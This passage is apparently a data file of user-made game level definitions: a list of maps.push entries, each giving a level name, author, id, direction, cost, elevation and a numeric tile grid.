,0,0,0,0,124,148,0,0,0,0,0,124,0,0,0,0,0,0,0,0,0,0,0,0,1,9998,105,105,105,105,105,1,0,0,0,0,0,0,0,0,0,0,0,0,1,105,90,105,105,90,105,1,0,0,0,0,0,0,0,0,0,0,0,0,1,105,105,105,105,105,9998,1,0,0,0,0,0,0,0,0,0,0,0,0,124,0,0,0,0,0,148,124,0,0,0,0,0,0,0,0,0,0,0,0,1,105,105,105,105,105,9998,1,0,0,0,0,0,0,0,1,1,1,1,1,1,105,90,105,105,90,105,1,1,1,1,1,1,0,0,1,93,17,94,51,149,105,105,105,105,105,105,149,51,94,17,93,1,0,0,1,1,1,1,1,1,105,105,2,2,105,105,1,1,1,1,1,1,0]});
maps.push({name="Boost Me",author="ZpLit",id="#1668270176",direction="forward",cost=323,elevation=0,map=[0,0,0,1,1,1,1,1,5,2,2,5,1,1,1,1,1,0,0,0,0,0,1,97,5,96,100,1,5,5,5,5,1,94,94,94,94,1,0,0,0,0,1,5,5,5,96,1,5,5,90,5,1,24,24,24,24,1,0,0,0,0,1,5,5,5,5,1,5,5,5,5,105,5,5,20,198,1,0,0,0,0,1,195,5,5,5,1,90,5,5,5,105,5,5,20,94,1,0,0,0,0,1,99,10,5,5,1,5,5,5,5,1,5,5,15,197,1,0,0,0,0,1,10,10,5,5,1,5,5,5,90,1,5,5,15,94,1,0,0,0,0,1,93,10,5,5,1,5,5,5,5,1,5,5,10,196,1,0,0,0,0,1,196,10,5,5,1,5,90,5,5,1,5,5,10,94,1,0,0,0,0,1,102,15,5,5,1,5,5,5,5,1,5,5,5,195,1,0,0,0,0,1,15,15,5,5,1,5,5,5,5,1,5,5,5,5,1,0,0,0,0,1,93,15,5,5,1,5,5,90,5,1,5,5,5,5,1,0,0,0,0,1,197,15,5,5,1,5,5,5,5,1,1,1,1,1,0,0,0,0,0,1,104,20,5,5,105,5,5,5,5,1,0,0,0,0,0,0,0,0,0,1,20,20,5,5,105,5,5,5,90,1,0,0,0,0,0,0,0,0,0,1,93,20,5,5,1,95,95,95,95,1,0,0,0,0,0,0,0,0,0,1,198,20,5,5,1,90,5,5,5,1,0,0,0,0,0,0,0,0,0,1,24,24,24,24,1,100,5,5,100,1,0,0,0,0,0,0,0,0,0,1,93,93,93,93,1,5,5,5,5,1,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,88,2,2,88,1,0,0,0,0,0,0,0]});
maps.push({name="Earthquake",author="sivi",id="#1668278240",direction="forward",cost=188,elevation=0,map=[0,0,0,0,0,0,0,0,14,2,2,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,152,152,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,152,152,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,152,152,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,152,152,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,152,152,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,152,152,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,152,152,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,152,152,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,152,152,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,152,152,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,152,152,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,152,152,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,152,152,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,152,152,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,152,152,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,152,152,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,152,152,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,152,152,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,2,2,14,0,0,0,0,0,0,0,0]});
maps.push({name="Rush B",author="sivi",id="#1668278325",direction="left",cost=327,elevation=-3,map=[0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,2,2,1,1,1,0,0,0,0,0,0,0,0,1,94,94,5,93,93,1,108,108,108,108,1,0,0,0,0,0,0,0,0,1,5,5,5,5,5,1,108,108,108,108,1,0,0,0,0,0,0,0,0,1,5,5,1,5,5,1,1,1,108,108,1,1,1,1,1,0,1,1,1,1,105,105,1,105,105,1,1,1,108,108,1,2,105,105,1,0,1,5,5,5,5,5,5,5,5,5,5,1,109,109,1,2,105,105,1,0,1,5,5,5,5,5,5,5,5,5,5,110,9998,109,1,1,105,105,1,1,1,5,5,5,5,5,5,5,5,5,5,1,109,109,1,1,105,105,105,105,1,5,5,12,12,46,46,12,12,5,5,110,9998,109,1,1,105,105,105,9998,106,9998,5,12,90,46,46,90,12,5,5,1,109,109,1,1,105,105,105,105,1,5,5,46,46,46,46,46,46,5,5,1,109,1,1,1,105,105,1,1,1,5,5,46,46,46,46,46,46,5,5,9,9,9,1,1,105,105,1,0,1,5,5,12,46,46,46,90,12,5,5,9,9,9,1,1,105,105,1,1,1,5,5,12,12,46,46,12,12,5,5,6,6,6,1,1,105,105,105,105,105,5,5,5,5,5,5,5,5,5,5,6,9,6,1,1,1,1,1,1,1,5,5,5,5,5,5,5,5,5,9998,90,9,6,1,0,0,0,0,0,1,1,1,1,5,5,7,7,5,5,1,1,1,1,1,0,0,0,0,0,0,0,0,1,5,5,5,5,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,5,5,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,0,0,0,0]});
maps.push({name="Jump Over Stream",author="FL00D",id="#1668281585",direction="right",cost=339,elevation=10,map=[0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,14,14,14,14,19,19,19,96,96,19,19,19,19,2,0,0,9,9,9,3,14,14,14,14,19,97,19,96,96,19,19,19,19,2,0,0,9,9,9,9,14,14,14,14,19,19,19,1,1,96,96,1,0,0,0,0,9,9,9,9,66,73,73,73,19,19,19,1,1,19,19,1,0,0,0,0,9,9,9,9,14,14,14,14,66,73,73,1,1,19,19,1,0,0,0,0,9,9,9,9,14,14,14,14,66,73,73,1,1,19,19,1,0,0,0,0,9,9,9,9,66,73,73,73,19,19,19,1,1,19,19,1,0,0,0,0,9,9,9,9,14,14,14,14,66,73,73,1,1,19,19,1,0,0,0,0,9,9,9,9,14,14,14,14,66,73,73,1,1,19,19,1,0,0,0,0,9,9,9,9,66,73,73,73,19,19,19,1,1,19,19,1,0,0,0,0,9,9,9,9,14,14,14,14,66,73,73,1,1,19,19,1,0,0,0,0,9,9,9,9,14,14,14,14,66,73,73,1,1,19,19,1,0,0,0,0,9,9,9,9,66,73,73,73,19,19,19,1,1,19,19,1,0,0,0,0,9,9,9,9,14,14,14,14,19,19,19,19,19,19,19,1,0,0,0,0,9,9,9,9,14,14,14,3,19,19,19,19,19,19,19,1,0,0,0,0,0,0,0,0,14,14,14,14,19,19,19,19,19,19,19,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="43856345753498534534",author="FL00D",id="#1668281642",direction="forward",cost=404,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,0,0,0,0,144,144,144,144,144,144,144,144,144,144,144,144,144,144,18,18,0,0,0,0,144,144,144,144,144,144,144,144,144,144,144,144,144,144,18,18,0,0,0,0,144,144,144,144,144,144,144,144,144,144,144,144,144,144,18,18,0,0,0,0,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,0,0,0,0,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,0,0,0,0,18,18,144,144,144,144,144,144,144,144,144,144,144,144,144,144,0,0,0,0,18,18,144,144,144,144,144,144,144,144,144,144,144,144,144,144,0,0,0,0,18,18,144,144,144,144,144,144,144,144,144,144,144,144,144,144,0,0,0,0,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Back Around For Trig",author="FL00D",id="#1668281884",direction="right",cost=107,elevation=0,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,49,49,49,49,49,49,49,0,0,0,0,0,0,0,0,0,0,0,0,0,49,49,49,49,49,49,49,0,0,0,0,0,9,9,9,9,2,0,0,0,49,49,0,0,0,0,0,35,35,0,0,0,9,9,9,9,2,0,0,0,49,49,0,0,0,0,0,35,97,0,0,0,9,9,0,0,0,0,0,0,49,49,0,0,0,0,0,0,0,0,0,0,96,96,0,0,0,0,0,0,49,49,0,0,0,0,0,0,0,0,0,0,96,96,0,0,0,0,0,0,49,49,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,49,49,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,49,49,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,49,49,0,0,0,0,0,0,0,0,0,0,11,9,0,0,0,0,0,0,49,49,0,0,0,0,0,0,0,0,0,0,13,9,0,0,0,0,0,0,49,49,49,49,49,49,49,49,49,49,49,49,49,49,0,0,0,0,0,0,49,49,49,49,49,49,49,49,49,49,49,49,49,49,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Trigger on Top 1",author="TF2 Pencil",id="#1668284873",direction="right",cost=204,elevation=0,map=[0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,0,35,35,35,35,36,37,38,39,40,41,42,43,43,0,0,0,0,10,10,0,35,35,35,35,36,37,38,39,40,41,42,43,43,0,0,0,0,10,10,0,35,35,35,35,0,0,0,0,0,0,0,43,43,0,0,0,0,10,10,0,35,35,35,35,0,0,0,43,43,43,43,43,43,0,0,0,0,10,10,0,35,35,35,35,0,0,0,43,100,43,43,43,43,0,0,0,0,10,10,0,0,0,0,0,0,0,0,43,43,43,43,43,43,0,0,0,0,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,0,0,0,0,10,10,10,10,10,10,10,10,10,10,66,66,66,66,66,10,0,0,0,0,0,0,0,0,0,0,0,0,0,10,66,66,66,66,66,10,0,0,0,0,31,31,0,0,126,126,0,0,0,10,66,66,66,66,66,10,0,0,0,0,31,31,0,0,34,34,0,0,0,10,66,66,66,66,66,10,0,0,0,0,0,0,0,0,34,34,0,0,0,10,66,66,66,66,66,10,0,0,0,0,32,32,0,0,34,34,0,0,0,10,10,10,10,10,10,10,10,2,0,0,32,32,0,0,0,0,0,0,0,10,10,10,10,10,10,10,10,2,0,0,0,0,0,33,33,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,33,33,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Trigger on Top 2",author="TF2 Pencil",id="#1668284912",direction="right",cost=240,elevation=0,map=[0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,7,7,7,7,7,7,3,16,16,16,16,16,16,0,0,0,0,0,7,7,7,7,7,7,7,7,7,16,16,16,16,16,16,0,0,0,0,0,1,1,1,1,1,1,1,107,107,1,1,1,1,16,16,0,0,0,0,0,1,18,18,18,18,18,18,7,7,0,128,16,16,16,16,0,0,0,0,0,1,18,18,18,18,18,18,7,7,0,128,16,16,16,16,0,0,0,0,0,1,18,18,1,1,1,1,107,107,1,1,1,1,1,1,1,0,0,0,0,1,18,18,1,97,24,24,7,7,24,24,24,24,125,20,1,0,0,0,0,1,18,18,1,131,24,24,7,7,24,24,24,24,125,20,1,0,0,0,0,1,18,18,1,1,1,1,107,107,1,1,1,1,20,20,1,0,0,0,0,1,18,18,18,18,129,0,7,7,20,20,20,20,20,20,1,0,0,0,0,1,18,18,18,18,129,0,7,7,20,20,20,20,20,20,1,0,0,0,0,1,1,1,1,1,1,1,107,107,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,7,132,7,7,96,96,7,7,7,7,7,2,0,0,0,0,0,0,0,0,7,7,7,7,96,96,7,7,7,7,7,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Find TP1",author="TF2 Pencil",id="#1668285049",direction="left",cost=223,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,8,8,0,0,0,0,0,0,1,132,13,8,8,8,8,8,8,8,8,1,8,8,0,0,0,0,0,0,1,13,13,8,8,133,8,8,8,133,8,1,8,8,0,0,0,0,0,0,1,13,13,8,8,8,8,8,8,8,8,1,8,8,0,0,0,0,0,0,1,13,13,8,8,8,8,8,8,8,8,1,8,8,0,0,0,0,0,0,1,97,13,8,8,8,8,8,8,8,8,1,8,8,0,0,0,0,0,0,1,13,13,8,8,133,8,8,8,131,8,1,8,8,0,0,0,0,0,0,1,8,8,8,8,8,8,8,8,8,8,1,8,8,0,0,0,0,0,0,1,8,8,8,8,8,8,8,8,8,8,1,8,8,0,0,0,0,0,0,1,134,8,8,8,8,8,8,8,8,8,1,8,8,0,0,0,0,0,0,1,8,8,8,8,8,8,8,8,8,8,1,8,8,0,0,0,2,8,8,96,8,8,8,8,8,8,8,8,8,8,8,8,8,0,0,0,2,8,8,96,8,8,8,8,8,8,8,8,8,8,8,8,8,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Grab It Quick",author="FL00D",id="#1668285111",direction="right",cost=163,elevation=0,map=[0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,35,35,33,33,31,31,0,0,0,0,0,0,0,0,9,9,0,0,0,0,35,35,33,33,31,31,0,0,0,0,0,0,0,0,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,96,96,9,2,0,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,96,96,9,2,0,9,9,0,0,0,0,35,35,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,35,35,0,0,0,0,0,0,0,0,0,0,0,0,4,4,0,0,0,0,37,37,0,0,0,0,32,0,0,0,0,0,0,0,15,15,0,0,0,0,37,37,0,0,0,0,32,0,0,0,0,0,0,0,15,15,0,0,0,0,39,39,0,0,0,0,32,32,32,32,0,0,0,0,0,0,0,0,0,0,97,39,0,0,0,1,1,1,115,115,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,195,115,115,115,115,115,1,0,0,35,35,0,0,35,35,0,0,35,35,0,195,115,93,93,93,93,1,0,0,35,35,0,0,35,35,0,0,35,35,0,195,115,93,93,93,93,1,0,0,0,0,0,0,0,0,0,0,0,0,0,195,115,115,115,115,115,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Elevator jump off",author="TF2 Pencil",id="#1668285206",direction="forward",cost=106,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,1,20,20,20,20,20,3,12,12,12,12,12,12,0,0,0,0,0,0,0,1,20,20,20,20,20,3,12,12,12,12,12,12,0,0,0,0,0,0,0,1,92,1,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,12,0,0,0,0,0,0,0,0,0,0,18,18,18,18,15,15,15,12,12,0,0,0,0,0,0,0,0,0,0,0,18,97,18,18,15,15,15,12,12,0,0,0,0,0,0,0,0,0,0,0,18,18,18,18,15,15,15,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,20,20,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,20,20,0,0,0,0,0,0,0,96,96,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,96,96,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0]});
maps.push({name="Intersection",author="Block",id="#1668288603",direction="left",cost=378,elevation=4,map=[15,104,16,17,18,19,20,20,20,19,18,17,16,100,0,0,0,0,2,2,2,15,16,17,18,19,20,20,20,19,18,17,16,16,0,0,0,11,11,11,2,15,16,17,18,19,20,20,20,19,18,17,16,16,0,0,0,11,11,11,15,15,0,0,0,0,21,21,20,0,0,1,15,15,0,0,0,11,11,11,14,14,0,0,0,22,22,21,21,0,0,1,14,14,0,103,0,11,11,11,101,101,101,0,23,23,22,22,22,0,0,1,13,13,12,11,103,11,1,96,14,14,14,14,24,23,23,23,23,0,0,1,13,13,12,11,103,11,1,96,14,14,14,14,24,24,24,24,24,99,0,1,1,1,1,103,0,11,1,11,14,15,16,17,18,19,19,19,19,19,196,0,0,0,0,0,0,11,1,11,14,15,16,17,18,19,19,19,19,196,19,0,0,0,0,0,0,195,1,11,14,15,16,17,18,19,19,19,196,19,19,19,0,0,0,0,0,195,1,11,14,14,14,14,0,0,0,196,19,19,19,19,19,19,0,0,0,11,1,11,14,14,1,14,0,0,0,0,1,19,19,19,19,19,0,0,97,11,1,11,14,14,1,14,1,1,1,1,1,98,98,19,19,18,0,0,0,11,1,11,14,14,1,14,1,19,19,19,19,19,98,1,1,17,0,0,0,96,1,11,14,14,1,93,1,18,0,0,0,19,19,19,1,16,0,0,96,11,1,11,14,14,1,1,16,17,0,77,77,0,0,18,1,15,14,13,12,11,1,11,14,14,1,1,15,0,77,24,24,77,0,17,1,1,1,1,1,1,1,11,14,14,14,103,14,0,77,24,24,77,0,16,0,0,13,13,13,0,11,11,102,14,103,103,14,0,0,77,77,0,0,15,14,14,14,0,12,12,12,0]});
maps.push({name="RACE Simple Turn",author="FL00D",id="#1668290472",direction="left",cost=115,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,12,2,2,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,12,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,12,12,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,12,12,12,12,12,0,0,0,0,0,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,0,0,0,0,0,2,12,12,12,12,12,12,12,12,12,12,12,12,12,12,0,0,0,0,0,2,12,12,12,12,12,12,12,12,12,12,12,12,12,0,0,0,0,0,0,12,12,12,12,12,12,12,12,12,12,12,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Square Ring Pool",author="TF2 Pencil",id="#1668310165",direction="right",cost=318,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,15,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,15,15,15,24,24,24,24,24,24,24,0,0,0,0,0,24,15,15,15,15,15,15,15,15,15,15,15,15,15,24,0,0,0,0,0,24,15,66,66,66,66,66,66,66,66,66,66,66,15,24,0,0,0,0,0,24,15,66,66,66,66,66,66,66,66,66,66,66,15,24,0,0,0,0,0,24,15,66,66,15,15,15,15,15,15,15,66,66,15,24,0,0,0,0,0,24,15,66,66,15,24,24,24,24,24,15,66,66,15,24,0,0,0,0,0,24,15,66,66,15,24,0,0,0,24,15,66,66,15,24,0,0,0,0,0,24,15,66,66,15,24,0,0,0,24,15,66,66,15,24,0,0,0,0,0,24,15,66,66,15,24,0,0,0,24,15,66,66,15,24,0,0,0,0,0,24,15,66,66,15,24,24,24,24,24,15,66,66,15,24,0,0,0,0,0,24,15,66,66,15,15,15,15,15,15,15,66,66,15,24,0,0,0,0,0,24,15,66,66,66,66,66,66,66,66,66,66,66,15,24,24,0,0,0,0,24,15,66,66,66,66,66,66,66,66,66,66,66,15,15,15,2,0,0,0,24,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,2,0,0,0,24,15,15,15,15,15,15,15,15,15,15,15,15,15,15,24,0,0,0,0,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Ominous",author="Block",id="#1668314779",direction="forward",cost=437,elevation=0,map=[10,10,10,10,10,10,1,1,1,1,1,10,10,132,10,24,77,0,2,2,11,11,1,1,1,10,10,10,10,10,10,10,10,10,24,77,0,5,5,5,12,12,1,0,0,0,38,37,36,16,16,16,24,24,77,0,5,5,5,0,13,13,1,0,0,39,38,1,1,56,56,1,24,77,0,5,5,5,0,77,14,14,1,0,38,39,1,1,57,56,1,24,77,0,5,5,5,0,77,24,15,15,1,37,38,1,1,58,57,1,24,77,0,131,5,5,0,77,24,0,16,16,36,37,1,1,59,58,1,24,77,0,1,1,131,0,77,24,0,0,16,16,36,0,1,60,59,1,24,77,0,5,1,1,0,77,24,0,0,0,1,1,1,1,61,60,1,24,77,0,5,134,5,0,77,24,93,5,0,0,1,90,61,61,61,1,24,77,0,5,5,5,0,77,24,5,5,8,9,9,1,61,61,61,1,24,77,0,5,5,5,0,77,24,5,5,5,6,7,9,1,61,61,1,24,77,0,5,5,5,0,77,24,5,138,5,5,6,7,9,1,133,1,24,77,0,136,5,5,0,77,24,1,1,1,1,1,1,8,10,1,1,24,77,0,1,1,136,0,77,24,124,116,88,116,113,114,1,9,11,1,24,77,0,5,1,1,0,77,24,118,124,116,116,116,113,114,1,10,12,0,77,0,5,139,5,0,77,24,1,118,124,116,116,1,114,114,1,11,13,77,0,5,5,5,0,77,24,1,1,118,115,116,116,1,114,114,1,12,14,1,5,5,5,0,77,24,1,118,118,118,115,116,116,1,114,114,114,13,15,5,5,5,0,77,24,118,137,118,118,118,124,116,90,1,90,114,114,13,15,2,2,1,77,24,1,1,1,1,1,1,1,1,1,1,1,1,1,15,15]});
maps.push({name="Left or Right",author="ZpLit",id="#1668324130",direction="forward",cost=204,elevation=2,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,94,14,13,13,13,13,13,13,13,13,13,13,13,13,13,13,14,94,0,0,14,14,13,13,13,13,13,13,13,13,13,13,13,13,13,13,14,14,0,0,14,14,0,0,0,0,0,0,13,13,0,0,0,0,0,0,14,14,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,14,14,0,0,0,0,0,0,87,87,0,0,0,0,0,0,14,14,0,0,14,14,0,0,0,0,0,0,14,85,0,0,0,0,0,0,14,14,0,0,14,14,0,0,0,0,0,0,85,14,0,0,0,0,0,0,14,14,0,0,91,91,0,0,0,0,0,0,14,85,0,0,0,0,0,0,91,91,0,0,91,91,0,0,0,0,0,0,85,14,0,0,0,0,0,0,91,91,0,0,14,14,0,0,1,0,0,0,95,95,0,0,0,1,0,0,14,14,0,0,14,14,0,1,0,1,0,0,14,14,0,0,1,0,1,0,14,14,0,0,14,14,0,1,0,0,1,0,93,93,0,1,0,0,1,0,14,14,0,0,14,14,0,1,0,0,0,1,0,0,1,0,0,0,1,0,14,14,0,0,14,14,0,0,1,1,1,0,0,0,0,1,1,1,0,0,14,14,0,0,14,14,0,0,0,0,0,0,87,87,0,0,0,0,0,0,14,14,0,0,15,15,15,15,95,95,15,15,15,15,15,15,95,95,15,15,15,15,0,0,100,15,15,15,95,95,15,15,15,15,15,15,95,95,15,15,15,100,0,0,0,0,0,0,0,0,0,88,2,2,88,0,0,0,0,0,0,0,0]});
maps.push({name="Prayge For Items",author="ZpLit",id="#1668324597",direction="forward",cost=335,elevation=0,map=[0,0,0,0,1,1,1,1,14,2,2,14,1,0,0,0,0,0,0,0,0,0,0,1,144,144,14,1,14,14,14,14,1,0,0,0,0,0,0,0,0,0,0,1,144,144,14,1,14,14,14,90,1,0,0,0,0,0,0,0,0,0,0,1,144,144,14,1,90,14,14,14,1,1,1,0,0,0,0,0,0,0,0,1,144,144,14,1,14,14,14,14,14,14,14,1,0,0,0,0,0,0,0,1,144,144,14,1,14,14,90,14,14,14,14,1,0,0,0,0,0,0,0,1,144,144,14,1,90,14,14,14,1,14,14,1,0,0,0,0,0,0,0,1,144,144,14,1,14,14,14,14,1,94,94,1,0,0,0,0,0,0,0,1,144,144,14,1,14,14,14,14,1,94,94,1,0,0,0,0,0,0,0,1,144,144,14,1,14,90,14,14,1,1,1,0,0,0,0,0,0,0,0,1,144,144,14,1,14,14,14,14,1,0,0,0,0,0,0,0,0,0,0,1,144,144,14,1,14,14,14,90,1,0,0,0,0,0,0,0,0,0,0,1,144,144,14,1,14,14,14,14,1,0,0,0,0,0,0,0,0,0,0,1,144,144,14,1,90,14,14,14,1,0,0,0,0,0,0,0,0,0,0,1,144,144,14,14,14,14,14,90,1,0,0,0,0,0,0,0,0,0,0,1,144,144,14,14,14,14,14,14,1,0,0,0,0,0,0,0,0,0,0,1,144,144,14,1,14,14,90,14,1,0,0,0,0,0,0,0,0,0,0,1,144,144,14,1,90,14,14,14,1,0,0,0,0,0,0,0,0,0,0,1,144,144,14,1,14,14,14,14,1,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,88,2,2,88,1,0,0,0,0,0,0,0]});
